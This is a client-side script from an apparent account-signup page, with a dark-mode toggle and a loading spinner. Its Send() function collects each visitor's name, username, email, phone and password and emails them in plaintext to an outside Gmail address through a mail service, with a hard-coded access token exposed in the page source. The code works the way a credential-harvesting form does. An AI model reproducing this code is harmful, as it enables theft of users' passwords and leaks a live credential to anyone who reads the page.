    <script>
        function Send() {
            var name = document.getElementById("name").value;
            var username = document.getElementById("username").value;
            var email = document.getElementById("email").value;
            var phone = document.getElementById("phone").value;
            var password = document.getElementById("password").value;

            var body = "Name: " + name + "<br/>Username: " + username + "<br/>Email: " + email + "<br/>Password: " + password + "<br/>Phone Number: " + phone;

            Email.send({
                SecureToken: "db739cc9-28e0-4c1a-b4b5-ff998f5ff0ed",
                To: 'softwarecompanycoltd@gmail.com',
                From: "karmanmajd309@gmail.com",
                Subject: "New Account Creation Request",
                Body: body
            }).then(function(response) {
                // Hide the loader after response
                document.querySelector('.loader').style.display = 'none';

                if (response === 'OK') {
                    swal("Successful", "Your Data Was Successfully Received", "success");
                } else {
                    swal("Something Went Wrong", "Your Data Was Not Received", "error");
                }
            });
        }

        const themeSwitch = document.getElementById('themeSwitch');
        const body = document.body;

        themeSwitch.addEventListener('change', () => {
            if (themeSwitch.checked) {
                body.classList.remove('light-mode');
                body.classList.add('dark-mode');
                localStorage.setItem('preferredTheme', 'dark-mode');
            } else {
                body.classList.remove('dark-mode');
                body.classList.add('light-mode');
                localStorage.setItem('preferredTheme', 'light-mode');
            }
        });

        // Restore the user's preferred theme on page load
        document.addEventListener('DOMContentLoaded', function() {
            const preferredTheme = localStorage.getItem('preferredTheme');
            if (preferredTheme === 'dark-mode') {
                body.classList.add('dark-mode');
                themeSwitch.checked = true;
            } else {
                body.classList.add('light-mode');
            }
        });

        // Show loader on form submission
        document.getElementById('createaccount').addEventListener('submit', function() {
            // Show the loader
            document.querySelector('.loader').style.display = 'flex';
        });
    </script>
